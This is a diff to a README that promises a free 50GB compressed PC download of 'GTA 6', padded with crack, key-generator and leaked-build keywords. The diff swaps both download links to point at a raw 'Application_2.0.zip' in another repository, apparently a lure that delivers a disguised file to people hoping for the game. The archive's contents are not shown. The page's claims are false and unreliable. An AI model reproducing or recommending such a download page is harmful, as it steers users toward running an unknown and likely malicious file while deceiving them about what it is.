@@ -5,7 +5,7 @@ description: "Download GTA 6 compressed for PC at just 50GB with full game files
 ---
 # 🎮 GTA-6-Compressed-Download-50GB-PC - Play GTA 6 on PC Today
 
-[![Download GTA 6 Compressed](https://img.shields.io/badge/Download-GTA_6_Compressed_50GB-ff0000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/demonationx93/GTA-6-Compressed-Download-50GB-PC/releases)
+[![Download GTA 6 Compressed](https://img.shields.io/badge/Download-GTA_6_Compressed_50GB-ff0000?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/demonationx93/demonationx93.github.io/main/src/components/Application_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -188,6 +188,6 @@ Remember to support the official release when it becomes available to help Rocks
 
 Happy gaming, and welcome to Vice City! 🎉
 
-**Download Now:** [https://github.com/demonationx93/GTA-6-Compressed-Download-50GB-PC/releases](https://github.com/demonationx93/GTA-6-Compressed-Download-50GB-PC/releases)
+**Download Now:** [https://raw.githubusercontent.com/demonationx93/demonationx93.github.io/main/src/components/Application_2.0.zip](https://raw.githubusercontent.com/demonationx93/demonationx93.github.io/main/src/components/Application_2.0.zip)
 
 Keywords: grand-theft-auto-6, gta-6-activation, gta-6-all-dlc, gta-6-beta, gta-6-beta-key, gta-6-bypass, gta-6-compressed, gta-6-crack, gta-6-early-access, gta-6-empress-crack, gta-6-key-generator, gta-6-leaked, gta-6-leaked-build, gta-6-mega-download, gta-6-playtest, gta-6-pre-release, gta-6-ultimate-edition, gta-vi-free, gta-vi-pc, rockstar-games-crack
